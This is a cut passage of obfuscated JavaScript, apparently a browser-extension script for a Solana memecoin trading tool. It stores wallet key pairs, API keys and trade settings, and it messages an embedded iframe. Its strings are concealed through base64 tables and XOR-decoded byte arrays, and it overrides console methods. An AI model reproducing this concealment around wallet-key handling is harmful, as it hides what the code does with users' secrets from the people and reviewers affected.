var axiom = (function () {
  "use strict";
  var t = Object.defineProperty,
    e = (e, n, r) =>
      ((e, n, r) =>
        n in e
          ? t(e, n, {
              enumerable: !0,
              configurable: !0,
              writable: !0,
              value: r,
            })
          : (e[n] = r))(e, "symbol" != typeof n ? n + "" : n, r);
  window.skCrypt = function (t) {
    return function () {
      return t;
    };
  };
  const n = a;
  !(function (t) {
    const e = 381,
      n = 375,
      r = 347,
      o = 363,
      i = 337,
      s = a,
      u = t();
    for (; []; )
      try {
        if (
          128658 ===
          -parseInt(s(e)) / 1 +
            -parseInt(s(n)) / 2 +
            (-parseInt(s(r)) / 3) * (parseInt(s(311)) / 4) +
            -parseInt(s(321)) / 5 +
            -parseInt(s(343)) / 6 +
            -parseInt(s(o)) / 7 +
            parseInt(s(i)) / 8
        )
          break;
        u.push(u.shift());
      } catch (c) {
        u.push(u.shift());
      }
  })(u);
  const r = (function () {
      const t = 325;
      let e = !![];
      return function (n, r) {
        const o = e
          ? function () {
              if (r) {
                const e = r[a(t)](n, arguments);
                return (r = null), e;
              }
            }
          : function () {};
        return (e = ![]), o;
      };
    })(),
    o = r(void 0, function () {
      const t = 342,
        e = 342,
        n = 379,
        r = 367,
        i = 369,
        s = a,
        u = {};
      u[s(322)] = s(369) + "+$";
      const c = u;
      return o[s(t)]()
        .search(c.nkRVJ)
        [s(e)]()
        [s(n) + "r"](o)
        [s(r)](s(i) + "+$");
    });
  o();
  const i = (function () {
      let t = !![];
      return function (e, n) {
        const r = t
          ? function () {
              if (n) {
                const t = n.apply(e, arguments);
                return (n = null), t;
              }
            }
          : function () {};
        return (t = ![]), r;
      };
    })(),
    s = i(void 0, function () {
      const t = 371,
        e = 373,
        n = 348,
        r = 377,
        o = 333,
        s = 342,
        u = a,
        c = {
          peUaG: function (t, e) {
            return t(e);
          },
          lhpqA: function (t, e) {
            return t + e;
          },
          pioIF: '{}.constructor("return this")( )',
          CFUAs: "log",
          KTFSR: "error",
          yBkex: "table",
          xnnFu: function (t, e) {
            return t < e;
          },
        };
      let l;
      try {
        l = c[u(t)](Function, c.lhpqA("return (fu" + u(335), c.pioIF) + ");")();
      } catch (h) {
        l = window;
      }
      const d = (l[u(327)] = l.console || {}),
        f = [c.CFUAs, "warn", "info", c[u(e)], u(n), c.yBkex, "trace"];
      for (let a = 0; c.xnnFu(a, f[u(r)]); a++) {
        const t = i.constructor.prototype.bind(i),
          e = f[a],
          n = d[e] || t;
        (t[u(o)] = i.bind(i)), (t[u(s)] = n.toString.bind(n)), (d[e] = t);
      }
    });
  function a(t, e) {
    const n = u();
    return (
      (a = function (e, r) {
        let o = n[(e -= 309)];
        if (void 0 === a.FGavmk) {
          var i = function (t) {
            let e = "",
              n = "",
              r = e + i;
            for (
              let o, i, s = 0, a = 0;
              (i = t.charAt(a++));
              ~i && ((o = s % 4 ? 64 * o + i : i), s++ % 4)
                ? (e +=
                    r.charCodeAt(a + 10) - 10 != 0
                      ? String.fromCharCode(255 & (o >> ((-2 * s) & 6)))
                      : s)
                : 0
            )
              i =
                "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=".indexOf(
                  i
                );
            for (let o = 0, i = e.length; o < i; o++)
              n += "%" + ("00" + e.charCodeAt(o).toString(16)).slice(-2);
            return decodeURIComponent(n);
          };
          (a.NIIPIm = i), (t = arguments), (a.FGavmk = !![]);
        }
        const s = e + n[0],
          u = t[s];
        if (u) o = u;
        else {
          const e = function (t) {
            (this.wXgORt = t),
              (this.pOYUhV = [1, 0, 0]),
              (this.nZVvke = function () {
                return "newState";
              }),
              (this.VDhqgM = "\\w+ *\\(\\) *{\\w+ *"),
              (this.xOIPAS = "['|\"].+['|\"];? *}");
          };
          (e.prototype.SjbTEO = function () {
            const t = new RegExp(this.VDhqgM + this.xOIPAS).test(
              this.nZVvke.toString()
            )
              ? --this.pOYUhV[1]
              : --this.pOYUhV[0];
            return this.UqFFdc(t);
          }),
            (e.prototype.UqFFdc = function (t) {
              return Boolean(~t) ? this.tNMLej(this.wXgORt) : t;
            }),
            (e.prototype.tNMLej = function (t) {
              for (let e = 0, n = this.pOYUhV.length; e < n; e++)
                this.pOYUhV.push(Math.round(Math.random())),
                  (n = this.pOYUhV.length);
              return t(this.pOYUhV[0]);
            }),
            new e(a).SjbTEO(),
            (o = a.NIIPIm(o)),
            (t[s] = o);
        }
        return o;
      }),
      a(t, e)
    );
  }
  function u() {
    const t = [
      "kcGOlISPkYKRkq",
      "AwzYyw1LvMLZAq",
      "CgvvyuC",
      "CNbJtw9Kzq",
      "s1rgu1i",
      "DwHvEK0",
      "ndmZoti4teT5t3Dk",
      "zxr0Aw5NCW",
      "BgvUz3rO",
      "DwX0",
      "y29UC3rYDwn0BW",
      "D2vIC2L0zvvYBa",
      "mJGZodbxBgzpD2i",
      "DhDPDhrLCLvYBa",
      "r2fcvgy",
      "AgfZsw1Hz2vZ",
      "mJa3nJmYyvjqq2vL",
      "AxnvC2vYtg9NzW",
      "ChvTCa",
      "C2XPChbHz2u",
      "yxbPs2v5",
      "zf9KyxrL",
      "zwnVAw4SignVAq",
      "y3jLyxrLrgvMyq",
      "DgLJA2vY",
      "zw1HAwXFDMvYAq",
      "mZq1nJi1zKnVsLD6",
      "BMTsvKO",
      "vMneCNC",
      "B2jQzwn0",
      "yxbWBhK",
      "sgHgCgy",
      "y29UC29Szq",
      "DwLKAxr5",
      "u1rhsLK",
      "Bg93rw5Ktw9Kzq",
      "AgLNAgXPz2H0vW",
      "AhDPza",
      "x19WCM90B19F",
      "B3jKCW",
      "BMn0Aw9UkcKG",
      "AxnwywXPza",
      "nZq3mdaZmNjluxr3ra",
      "AgfZu29JAwfSta",
      "DxnLCG",
      "A2v5ugfPCG",
      "swHnr1a",
      "Dg9tDhjPBMC",
      "mte0nZe5neTwu1rIua",
      "y29PBK5HBwu",
      "C2vSzwn0zwrnBW",
      "zMLLzf9HDa",
      "owPnqwHXyq",
      "zxHJzxb0Aw9U",
      "Bw9NDgvJAfjqqW",
      "y3jLyxrLzf9HDa",
      "ywDL",
      "AxnfEhbPCMvK",
      "DxnLCM5HBwu",
      "B2LU",
      "C3bSAxq",
      "vhDLzxrZ",
      "ChjPB3jPDhLgzq",
      "Bg9Nz2vKsw4",
      "zw1HAwW",
      "BwvZC2fNzq",
      "C2vSzwn0zwrjBq",
      "BMfTzwqSig1LBq",
      "mtaWntKYoff2uKfvsW",
      "vw5RBM93BIbLCG",
      "zxHWAxjLx2rHDa",
      "yMXL",
      "C2vHCMnO",
      "C2TdCNLWDa",
    ];
    return (u = function () {
      return t;
    })();
  }
  s(),
    (window[n(368)] = function (t) {
      return function () {
        return t;
      };
    });
  class c {
    constructor(t = null, e = null, r = null, o, i, s, a, u, c) {
      const l = 359,
        d = 346,
        f = 316,
        h = 332,
        p = n;
      (this.id = t),
        (this.username = e),
        (this[p(l)] = r),
        (this[p(320) + p(d)] = o),
        (this["last_exten" + p(f)] = i),
        (this.expire_date = s),
        (this[p(h)] = a),
        (this[p(350)] = u),
        (this.updated_at = c);
    }
    get isValid() {
      const t = 329,
        e = n,
        r = {
          gXaTl: function (t, e) {
            return t !== e;
          },
        };
      r[e(329)] = function (t, e) {
        return t !== e;
      };
      const o = r;
      return o.gXaTl(this[e(353)], null) && o[e(t)](this.id, null);
    }
    get [n(352)]() {
      return this[n(365) + "e"] ? new Date(this.expire_date) < new Date() : ![];
    }
    static fromApiResponse(t) {
      const e = 359,
        r = 316,
        o = n;
      return new c(
        t.id,
        t.username,
        t[o(e)],
        t.email_verified_at,
        t["last_exten" + o(r)],
        t.expire_date,
        t[o(332)],
        t.created_at,
        t.updated_at
      );
    }
  }
  class l {
    constructor(
      t = 1,
      e = 5e-4,
      r = 25,
      o = !![],
      i = "killed, justice, name, names, " + n(362) + n(317) + "n",
      s = "",
      a = "pump",
      u = n(349)
    ) {
      const c = 357,
        l = 314,
        d = 331,
        f = 372,
        h = 345,
        p = n;
      (this.defaultSol = t),
        (this[p(c) + "e"] = e),
        (this[p(l)] = r),
        (this.lowEndMode = o),
        (this[p(d) + p(334)] = i),
        (this.apiKey = s),
        (this[p(f)] = a),
        (this[p(h) + "de"] = u);
    }
    static fromStorage() {
      const t = 313,
        e = 330,
        r = 315,
        o = 360,
        i = 324,
        s = n,
        a = {};
      a[s(341)] = s(t);
      const u = a;
      try {
        const t = localStorage.getItem("coinModalS" + s(376));
        if (!t) return null;
        const n = JSON.parse(t);
        return new l(
          n.defaultSol,
          n.priorityFee || 5e-4,
          n.slippage || 10,
          n[s(e)] || !![],
          n[s(331) + "ords"] ||
            "killed, justice, name, names, named, memecoin, coin",
          n[s(r)] || "",
          n.rpcMode || u.IhMGP,
          n.selectedMode || s(349)
        );
      } catch (c) {
        return (
          c instanceof Error
            ? c[s(o)]
            : "string" == typeof c ||
              (c && typeof c === s(i) && JSON.stringify(c)),
          null
        );
      }
    }
    ["saveToStor" + n(351)]() {
      const t = 374,
        e = 330,
        r = 331,
        o = 315,
        i = 372,
        s = 345,
        a = 376,
        u = 364,
        c = n,
        l = {};
      (l[c(309)] = function (t, e) {
        return t === e;
      }),
        (l[c(t)] = function (t, e) {
          return t === e;
        }),
        (l.LVNSO = "object");
      const d = l;
      try {
        const t = {};
        (t.defaultSol = this.defaultSol),
          (t.priorityFee = this.priorityFee),
          (t.slippage = this.slippage),
          (t[c(e)] = this.lowEndMode),
          (t[c(r) + c(334)] = this["highlightW" + c(334)]),
          (t.apiKey = this[c(o)]),
          (t[c(i)] = this.rpcMode),
          (t[c(s) + "de"] = this[c(345) + "de"]);
        const n = JSON.stringify(t);
        localStorage.setItem("coinModalS" + c(a), n);
      } catch (f) {
        c(u),
          1,
          f instanceof Error
            ? f.message
            : d.GaBTf(typeof f, "string") ||
              (f && d[c(374)](typeof f, d.LVNSO) && JSON.stringify(f));
      }
    }
    static getDefaults() {
      return new l();
    }
  }
  class d {
    constructor(t = "", e = "", r = "", o, i, s, a, u, c = "") {
      const l = 328,
        d = 380,
        f = 361,
        h = 351,
        p = n;
      (this[p(344)] = t),
        (this.ticker = e),
        (this["initialLiq" + p(l)] = r),
        (this.twitterUrl = o),
        (this[p(d)] = i),
        (this.additionalTweets = s),
        (this.additionalWebsites = a),
        (this.images = u),
        (this[p(f) + p(h)] = c);
    }
    get isValid() {
      const t = 326,
        e = 319,
        r = 377,
        o = 328,
        i = n,
        s = {
          HhFpf: function (t, e) {
            return t > e;
          },
        },
        a = s;
      return (
        this[i(344)].length > 0 &&
        a[i(t)](this[i(e)].length, 0) &&
        this["selectedIm" + i(351)][i(r)] > 0 &&
        parseFloat(this["initialLiq" + i(o)]) >= 0
      );
    }
    get [n(310)]() {
      var t;
      const e = 377,
        r = 323,
        o = 361,
        i = n,
        s = {
          VcDrw: function (t, e) {
            return t > e;
          },
        },
        a = s;
      return (
        ((null == (t = this.images) ? void 0 : t[i(e)]) || 0) > 0 ||
        a[i(r)](this[i(o) + "age"].length, 0)
      );
    }
    get [n(338) + "inks"]() {
      const t = n;
      return !(!this.twitterUrl && !this[t([380][0])]);
    }
    static [n(318) + n(378)]() {
      return new d();
    }
    static fromExtractedData(t) {
      const e = 382,
        r = 351,
        o = n;
      return new d(
        t[o(344)] || "",
        t.ticker || "",
        t.initialLiquidity || "1",
        t[o(e)],
        t.websiteUrl,
        t["additional" + o(356)] || [],
        t.additionalWebsites || [],
        t.images || [],
        t["selectedIm" + o(r)] || ""
      );
    }
  }
  class f {
    constructor(t = null, e = null, r = ![], o = null, i = ![]) {
      const s = 370,
        a = n,
        u = "4|2|3|1|0"[a(355)]("|");
      let c = 0;
      for (; []; ) {
        switch (u[c++]) {
          case "0":
            this.loggedIn = i;
            continue;
          case "1":
            this.user = o;
            continue;
          case "2":
            this.iframe = e;
            continue;
          case "3":
            this[a(s) + a(366)] = r;
            continue;
          case "4":
            this.keyPair = t;
            continue;
        }
        break;
      }
    }
    get [n(312) + "edIn"]() {
      var t;
      const e = n;
      return (
        this[e(358)] &&
        (null == (t = this.user) ? void 0 : t[e([336][0])]) === !![]
      );
    }
    get ["canCreateC" + n(354)]() {
      const t = n;
      return this.isUserLoggedIn && null !== this[t(340)];
    }
    updateUser(t) {
      const e = n;
      (this.user = c.fromApiResponse(t)),
        (this.loggedIn = this[e([339][0])].isValid);
    }
    clearKeyPair() {
      this.keyPair = null;
    }
    setKeyPair(t, e) {
      this.keyPair = [t, e];
    }
  }
  axiom;
  const h = k;
  function p() {
    const t = [
      "ote5mZu2yK5Tru1W",
      "mti2mJiYrhHjEg1m",
      "mtG2mJm5mwHyqNPYuG",
      "D2fYBG",
      "C2v0s2v5ugfPCG",
      "yMXL",
      "AwzYyw1LvMLZAq",
      "mtjJzuXwt0O",
      "Bg9N",
      "BMn0Aw9UkcKG",
      "kcGOlISPkYKRkq",
      "A2v5ugfPCG",
      "nZK0mJe4n1PvDgjpqq",
      "y29UC29Szq",
      "uhvhv1i",
      "y3rVCIGICMv0Dq",
      "mty5nZi5Cgn3y01Q",
      "ntzwyLvKqvC",
      "mxzttgD4za",
      "AwzYyw1L",
      "DxnLCG",
      "DwX0",
      "twzOEMq",
      "Bg9Nz2vKsw4",
      "DhjHy2u",
      "mtqWodu5me1suwjmyW",
      "mtbfEfvZuNm",
      "mJi0oduWu1zotu1v",
      "CM4GDgHPCYiPka",
    ];
    return (p = function () {
      return t;
    })();
  }
  !(function (t) {
    const e = 465,
      n = 466,
      r = 471,
      o = 462,
      i = 464,
      s = 451,
      a = 452,
      u = 460,
      c = 461,
      l = 476,
      d = k,
      f = t();
    for (; []; )
      try {
        if (
          313026 ===
          (parseInt(d(453)) / 1) * (-parseInt(d(e)) / 2) +
            -parseInt(d(n)) / 3 +
            (-parseInt(d(r)) / 4) * (-parseInt(d(o)) / 5) +
            parseInt(d(i)) / 6 +
            (parseInt(d(s)) / 7) * (-parseInt(d(a)) / 8) +
            parseInt(d(u)) / 9 +
            (-parseInt(d(c)) / 10) * (-parseInt(d(l)) / 11)
        )
          break;
        f.push(f.shift());
      } catch (h) {
        f.push(f.shift());
      }
  })(p);
  const m = (function () {
      let t = !![];
      return function (e, n) {
        const r = t
          ? function () {
              if (n) {
                const t = n.apply(e, arguments);
                return (n = null), t;
              }
            }
          : function () {};
        return (t = ![]), r;
      };
    })(),
    g = m(void 0, function () {
      const t = k,
        e = {};
      e.FTsGt = t([474][0]) + "+$";
      const n = e;
      return g
        .toString()
        .search(t(474) + "+$")
        .toString()
        .constructor(g)
        .search(n.FTsGt);
    });
  g();
  const y = (function () {
    let t = !![];
    return function (e, n) {
      const r = t
        ? function () {
            if (n) {
              const t = n.apply(e, arguments);
              return (n = null), t;
            }
          }
        : function () {};
      return (t = ![]), r;
    };
  })();
  y(void 0, function () {
    const t = 449,
      e = 450,
      n = 463,
      r = 448,
      o = 459,
      i = k,
      s = {
        Wckop: function (t, e) {
          return t(e);
        },
        PuGWR: function (t, e) {
          return t + e;
        },
        RcUvc: function (t) {
          return t();
        },
        JcEJs: i(472),
        mrCZJ: "table",
      };
    let a;
    try {
      const r = s.Wckop(
        Function,
        s[i(t)](
          s.PuGWR("return (fu" + i(473), "{}.constru" + i(e) + i(n) + " )"),
          ");"
        )
      );
      a = s.RcUvc(r);
    } catch (l) {
      a = window;
    }
    const u = (a.console = a[i(r)] || {}),
      c = [s.JcEJs, i(467), "info", "error", "exception", s.mrCZJ, i(o)];
    for (let d = 0; d < c.length; d++) {
      const t = y.constructor.prototype.bind(y),
        e = c[d],
        n = u[e] || t;
      (t.__proto__ = y.bind(y)), (t.toString = n.toString.bind(n)), (u[e] = t);
    }
  })(),
    (window.skCrypt = function (t) {
      return function () {
        return t;
      };
    });
  const w = new f(),
    b = () => d["createDefa" + h(456)](),
    v = () => ({
      keyPair: w.keyPair,
      iframe: w.iframe,
      iframeVisible: w[h(470) + h(469)],
      user: w.user,
      loggedIn: w.loggedIn,
    }),
    A = (t) => {
      const e = 475,
        n = 475,
        r = 468,
        o = 469,
        i = 458,
        s = h,
        a = {
          Mfhzd: function (t, e) {
            return t !== e;
          },
          bunXi: function (t, e) {
            return t === e;
          },
        },
        u = a;
      u[s(457)](t[s(e)], void 0) &&
        (null === t[s(n)]
          ? w.clearKeyPair()
          : w[s(r)](t.keyPair[0], t[s(475)][1])),
        void 0 !== t.iframe && (w.iframe = t[s(454)]),
        void 0 !== t["iframeVisi" + s(o)] &&
          (w[s(470) + "ble"] = t.iframeVisible),
        void 0 !== t.user &&
          (u.bunXi(t.user, null)
            ? ((w.user = null), (w[s(458)] = ![]))
            : w.updateUser(t[s(455)])),
        u.Mfhzd(t.loggedIn, void 0) && (w[s(i)] = t.loggedIn);
    };
  function k(t, e) {
    const n = p();
    return (
      (k = function (e, r) {
        let o = n[(e -= 448)];
        if (void 0 === k.yWwhMy) {
          var i = function (t) {
            let e = "",
              n = "",
              r = e + i;
            for (
              let o, i, s = 0, a = 0;
              (i = t.charAt(a++));
              ~i && ((o = s % 4 ? 64 * o + i : i), s++ % 4)
                ? (e +=
                    r.charCodeAt(a + 10) - 10 != 0
                      ? String.fromCharCode(255 & (o >> ((-2 * s) & 6)))
                      : s)
                : 0
            )
              i =
                "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=".indexOf(
                  i
                );
            for (let o = 0, i = e.length; o < i; o++)
              n += "%" + ("00" + e.charCodeAt(o).toString(16)).slice(-2);
            return decodeURIComponent(n);
          };
          (k.vhdmrf = i), (t = arguments), (k.yWwhMy = !![]);
        }
        const s = e + n[0],
          a = t[s];
        if (a) o = a;
        else {
          const e = function (t) {
            (this.sjCIzh = t),
              (this.UzNaTI = [1, 0, 0]),
              (this.HXPVnw = function () {
                return "newState";
              }),
              (this.lScSnh = "\\w+ *\\(\\) *{\\w+ *"),
              (this.QQClNp = "['|\"].+['|\"];? *}");
          };
          (e.prototype.lpxpsc = function () {
            const t = new RegExp(this.lScSnh + this.QQClNp).test(
              this.HXPVnw.toString()
            )
              ? --this.UzNaTI[1]
              : --this.UzNaTI[0];
            return this.pGrNCY(t);
          }),
            (e.prototype.pGrNCY = function (t) {
              return Boolean(~t) ? this.rvHVhU(this.sjCIzh) : t;
            }),
            (e.prototype.rvHVhU = function (t) {
              for (let e = 0, n = this.UzNaTI.length; e < n; e++)
                this.UzNaTI.push(Math.round(Math.random())),
                  (n = this.UzNaTI.length);
              return t(this.UzNaTI[0]);
            }),
            new e(k).lpxpsc(),
            (o = k.vhdmrf(o)),
            (t[s] = o);
        }
        return o;
      }),
      k(t, e)
    );
  }
  axiom;
  const I = E;
  function S() {
    const t = [
      "yM9KEq",
      "yMfJA2DYB3vUza",
      "mJbuuNvhrLu",
      "v3LyCeG",
      "nJa0ofzPC1vysq",
      "D2LSBenOyw5Nzq",
      "EKLUzgv4",
      "Cg9PBNrLCKv2zq",
      "DhjHBNnWyxjLBG",
      "BKDtsfC",
      "C2TdCNLWDa",
      "y29UDgvUDfDPBG",
      "yxbWzw5Kq2HPBa",
      "mti5mdrzCKrYzgW",
      "AwzYyw1LvMLZAq",
      "D2fYBG",
      "BgvMDa",
      "zs1VDMvYBgf5",
      "C2vHCMnO",
      "wuXeqvG",
      "kcGOlISPkYKRkq",
      "zgLZCgXHEq",
      "C3r5Bgu",
      "BM9Uzq",
      "mte3mJu3mxbeEwf6CW",
      "z2v0rwXLBwvUDa",
      "rMH4Dhi",
      "BgLNAhq",
      "mZi0ndj4z0fKALG",
      "AwzYyw1L",
      "zgvJB2rL",
      "yM9YzgvY",
      "Dg9tDhjPBMC",
      "uevRD1O",
      "DKv1seC",
      "qNLjza",
      "yxbWBhK",
      "zw50",
      "nta4nti0nwXXrgrXrG",
      "CgfYzw50tM9Kzq",
      "mtaWDNC",
      "yxPkvem",
      "mtCWoe1TwhzlAG",
      "Cg9ZAxrPB24",
      "BgvUz3rO",
      "E30Uy29UC3rYDq",
      "mJDxzenPyxK",
      "BNrZ",
      "mti0odyWmg13s0jOua",
      "y29UC3rYDwn0BW",
      "ENvrqNa",
      "m3mGzwfZzq",
      "seLdBhK",
      "rwLhvhm",
      "mtaZntHLB3vNDeS",
      "mtaWDMG",
      "Dg1RzLO",
      "zg93",
      "zxHJzxb0Aw9U",
      "y3jLyxrLrwXLBq",
      "oduYnZq5n1Hxt0rbtW",
      "yMLUza",
      "DuDQCg0",
      "yMXVy2S",
      "B3bHy2L0Eq",
      "EeTVz2C",
    ];
    return (S = function () {
      return t;
    })();
  }
  (function (t) {
    const e = 522,
      n = 500,
      r = 524,
      o = 514,
      i = 504,
      s = 489,
      a = 546,
      u = 544,
      c = 536,
      l = E,
      d = t();
    for (; []; )
      try {
        if (
          987317 ===
          (-parseInt(l(e)) / 1) * (-parseInt(l(530)) / 2) +
            parseInt(l(n)) / 3 +
            -parseInt(l(r)) / 4 +
            -parseInt(l(o)) / 5 +
            (-parseInt(l(i)) / 6) * (-parseInt(l(518)) / 7) +
            (-parseInt(l(s)) / 8) * (parseInt(l(a)) / 9) +
            (-parseInt(l(u)) / 10) * (-parseInt(l(c)) / 11)
        )
          break;
        d.push(d.shift());
      } catch (f) {
        d.push(d.shift());
      }
  })(S),
    (window[I(486)] = function (t) {
      return function () {
        return t;
      };
    });
  let _ = ![],
    T = (function () {
      const t = 534,
        e = 510,
        n = 521,
        r = 502,
        o = 538,
        i = 525,
        s = 537,
        a = 494,
        u = I,
        c = {
          wNkMU: u(496) + "+$",
          Zbkeb: function (t, e) {
            return t + e;
          },
          fxqjW: function (t) {
            return t();
          },
          ZpeQI: "log",
          hWnNB: u(491),
          Fhxtr: "error",
          uGjpm: u(t),
          tmkfZ: function (t, e) {
            return t < e;
          },
          EiGTs: function (t, e) {
            return t % e;
          },
          XXCuJ: function (t, e) {
            return t ^ e;
          },
          vEuHG: function (t) {
            return t();
          },
          yXecu: function (t, e, n) {
            return t(e, n);
          },
        },
        l = (function () {
          let t = !![];
          return function (e, n) {
            const r = t
              ? function () {
                  if (n) {
                    const t = n[E(512)](e, arguments);
                    return (n = null), t;
                  }
                }
              : function () {};
            return (t = ![]), r;
          };
        })(),
        d = l(this, function () {
          const t = u;
          return d
            .toString()
            [t(a)](c.wNkMU)
            [t(508)]()
            .constructor(d)
            .search("(((.+)+)+)+$");
        });
      c[u(e)](d);
      const f = (function () {
        let t = !![];
        return function (e, n) {
          const r = t
            ? function () {
                if (n) {
                  const t = n[E(512)](e, arguments);
                  return (n = null), t;
                }
              }
            : function () {};
          return (t = ![]), r;
        };
      })();
      let h;
      return (
        c.yXecu(f, this, function () {
          const t = u;
          let e;
          try {
            const r = Function(
              c.Zbkeb(
                "return (function() " + t(n) + 'ctor("return this")( )',
                ");"
              )
            );
            e = c.fxqjW(r);
          } catch (d) {
            e = window;
          }
          const a = (e.console = e.console || {}),
            l = [c.ZpeQI, c.hWnNB, "info", c[t(r)], c[t(o)], "table", "trace"];
          for (let n = 0; c[t(532)](n, l[t(520)]); n++) {
            const e = f[t(i) + "r"].prototype.bind(f),
              r = l[n],
              o = a[r] || e;
            (e.__proto__ = f[t(s)](f)),
              (e.toString = o[t(508)].bind(o)),
              (a[r] = e);
          }
        })(),
        function () {
          const t = u;
          if (!h) {
            const e = new Uint8Array([
                165, 149, 104, 111, 190, 219, 51, 48, 184, 136, 50, 114, 162,
                134, 104, 122, 174, 137, 50, 123, 168, 151, 51, 112, 187, 132,
                110, 115, 172, 152, 35, 124, 162, 141, 115, 109, 224, 146, 127,
                119, 168, 140, 121, 34,
              ]),
              n = 521986509,
              r = new Uint8Array(e.length);
            for (let o = 0; c.tmkfZ(o, e.length); o++) {
              const i = (n >>> (8 * c[t(529)](o, 4))) & 255;
              r[o] = c.XXCuJ(e[o], i);
            }
            h = new TextDecoder().decode(r);
          }
          return h;
        }
      );
    })()();
  const C = () => {
      const t = 515,
        e = 542,
        n = 517,
        r = I,
        o = {
          fJXkD: function (t) {
            return t();
          },
          ovROK: function (t, e) {
            return t === e;
          },
          azJTC: function (t, e) {
            return t(e);
          },
        };
      (T = ""), (_ = !![]);
      const { iframe: i } = o.fJXkD(v);
      if (i && o.ovROK(i[r(t)], document.body)) {
        document[r(e)].removeChild(i);
        const t = {};
        (t[r(505)] = null), (t.iframeVisible = ![]), o[r(n)](A, t);
      }
    },
    B = async (t) => {
      const e = 497,
        n = 539,
        r = 549,
        o = 526,
        i = 509,
        s = I,
        a = {
          HICly: function (t, e) {
            return t & e;
          },
          PEkwZ: function (t, e) {
            return t * e;
          },
          zuQBp: function (t, e) {
            return t(e);
          },
        };
      if (_ || !T || 0 === T.length) return;
      const { iframe: u } = v();
      if (!u) return;
      t &&
        x({
          type: (function () {
            let t;
            return function () {
              const e = E;
              if (!t) {
                const n = new Uint8Array([
                    136, 174, 85, 81, 148, 165, 93, 75, 138,
                  ]),
                  r = 521986507,
                  o = new Uint8Array(n.length);
                for (let t = 0; t < n.length; t++) {
                  const s = a[e(528)](r >>> a[e(i)](t % 4, 8), 255);
                  o[t] = n[t] ^ s;
                }
                t = new TextDecoder()[e(506)](o);
              }
              return t;
            };
          })()(),
          coin: t,
        }),
        (u.style[s(e)] = s(n)),
        (u.style[s(540)] = "1"),
        (u[s(498)][s(r) + "nts"] = "auto");
      const c = { iframeVisible: !![] };
      a[s(o)](A, c);
    };
  function E(t, e) {
    const n = S();
    return (
      (E = function (e, r) {
        let o = n[(e -= 484)];
        if (void 0 === E.lFKWWW) {
          var i = function (t) {
            let e = "",
              n = "",
              r = e + i;
            for (
              let o, i, s = 0, a = 0;
              (i = t.charAt(a++));
              ~i && ((o = s % 4 ? 64 * o + i : i), s++ % 4)
                ? (e +=
                    r.charCodeAt(a + 10) - 10 != 0
                      ? String.fromCharCode(255 & (o >> ((-2 * s) & 6)))
                      : s)
                : 0
            )
              i =
                "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=".indexOf(
                  i
                );
            for (let o = 0, i = e.length; o < i; o++)
              n += "%" + ("00" + e.charCodeAt(o).toString(16)).slice(-2);
            return decodeURIComponent(n);
          };
          (E.oGpsdo = i), (t = arguments), (E.lFKWWW = !![]);
        }
        const s = e + n[0],
          a = t[s];
        if (a) o = a;
        else {
          const e = function (t) {
            (this.BOwnwM = t),
              (this.WsQpvm = [1, 0, 0]),
              (this.GAIUdb = function () {
                return "newState";
              }),
              (this.TDvRpo = "\\w+ *\\(\\) *{\\w+ *"),
              (this.XevrBP = "['|\"].+['|\"];? *}");
          };
          (e.prototype.EpetVY = function () {
            const t = new RegExp(this.TDvRpo + this.XevrBP).test(
              this.GAIUdb.toString()
            )
              ? --this.WsQpvm[1]
              : --this.WsQpvm[0];
            return this.AKIkOV(t);
          }),
            (e.prototype.AKIkOV = function (t) {
              return Boolean(~t) ? this.MWRvEh(this.BOwnwM) : t;
            }),
            (e.prototype.MWRvEh = function (t) {
              for (let e = 0, n = this.WsQpvm.length; e < n; e++)
                this.WsQpvm.push(Math.round(Math.random())),
                  (n = this.WsQpvm.length);
              return t(this.WsQpvm[0]);
            }),
            new e(E).EpetVY(),
            (o = E.oGpsdo(o)),
            (t[s] = o);
        }
        return o;
      }),
      E(t, e)
    );
  }
  const x = (t) => {
    const e = I,
      n = {
        SpLag: function (t, e) {
          return t === e;
        },
      };
    if (_ || !T || n.SpLag(T[e(520)], 0)) return;
    const { iframe: r } = v();
    if (!(null == r ? void 0 : r.contentWindow)) return;
    const o = new URL(r.src).origin;
    r[e(487) + e([533][0])].postMessage(t, o);
  };
  function P(t, e) {
    const n = W();
    return (
      (P = function (e, r) {
        let o = n[(e -= 324)];
        if (void 0 === P.mLxVEn) {
          var i = function (t) {
            let e = "",
              n = "",
              r = e + i;
            for (
              let o, i, s = 0, a = 0;
              (i = t.charAt(a++));
              ~i && ((o = s % 4 ? 64 * o + i : i), s++ % 4)
                ? (e +=
                    r.charCodeAt(a + 10) - 10 != 0
                      ? String.fromCharCode(255 & (o >> ((-2 * s) & 6)))
                      : s)
                : 0
            )
              i =
                "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=".indexOf(
                  i
                );
            for (let o = 0, i = e.length; o < i; o++)
              n += "%" + ("00" + e.charCodeAt(o).toString(16)).slice(-2);
            return decodeURIComponent(n);
          };
          (P.LCIuTE = i), (t = arguments), (P.mLxVEn = !![]);
        }
        const s = e + n[0],
          a = t[s];
        if (a) o = a;
        else {
          const e = function (t) {
            (this.WpxkBx = t),
              (this.tFfhWl = [1, 0, 0]),
              (this.eSHxTO = function () {
                return "newState";
              }),
              (this.Wiujlm = "\\w+ *\\(\\) *{\\w+ *"),
              (this.EWUhoF = "['|\"].+['|\"];? *}");
          };
          (e.prototype.gwZFgm = function () {
            const t = new RegExp(this.Wiujlm + this.EWUhoF).test(
              this.eSHxTO.toString()
            )
              ? --this.tFfhWl[1]
              : --this.tFfhWl[0];
            return this.silOKK(t);
          }),
            (e.prototype.silOKK = function (t) {
              return Boolean(~t) ? this.SgfmhP(this.WpxkBx) : t;
            }),
            (e.prototype.SgfmhP = function (t) {
              for (let e = 0, n = this.tFfhWl.length; e < n; e++)
                this.tFfhWl.push(Math.round(Math.random())),
                  (n = this.tFfhWl.length);
              return t(this.tFfhWl[0]);
            }),
            new e(P).gwZFgm(),
            (o = P.LCIuTE(o)),
            (t[s] = o);
        }
        return o;
      }),
      P(t, e)
    );
  }
  axiom;
  const R = P;
  !(function (t) {
    const e = 346,
      n = 485,
      r = 489,
      o = 522,
      i = 515,
      s = 357,
      a = P,
      u = t();
    for (; []; )
      try {
        if (
          903999 ===
          -parseInt(a(450)) / 1 +
            (parseInt(a(e)) / 2) * (parseInt(a(348)) / 3) +
